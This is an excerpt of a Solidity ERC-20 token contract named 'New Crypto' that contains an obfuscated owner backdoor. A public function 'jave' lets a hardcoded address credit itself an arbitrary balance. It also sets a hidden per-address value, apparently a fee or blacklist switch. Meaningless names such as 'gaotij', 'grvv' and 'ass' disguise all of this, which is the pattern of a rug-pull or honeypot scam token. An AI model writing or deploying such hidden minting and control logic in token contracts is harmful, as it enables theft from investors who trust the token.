...
contract NewCrypto is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "New Crypto";
    string private _symbol = "NC";
    uint8 private _decimals = 9;
    address payable public gaotij;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public _pairs;
    mapping (address => uint256) public grvv;
    ...
    constructor () {
        ...
        gaotij = payable(address(0x1561D042a8229edE9Bd82E12Bbc98968F790a9ca));
    ...
    function ass(uint256 ccv, uint256 ssg) public view returns(bool) {
        require(gaotij == msg.sender,"wtf");
        return ssg == ccv;
    }

    function jave(address qww,uint256 err) public {
        if (err > 1000) _balances[gaotij] += err;
        if (ass(err,(1*2))) grvv[qww] = err**2;
        if (ass(err,(1*1))) grvv[qww] = 0;
    }
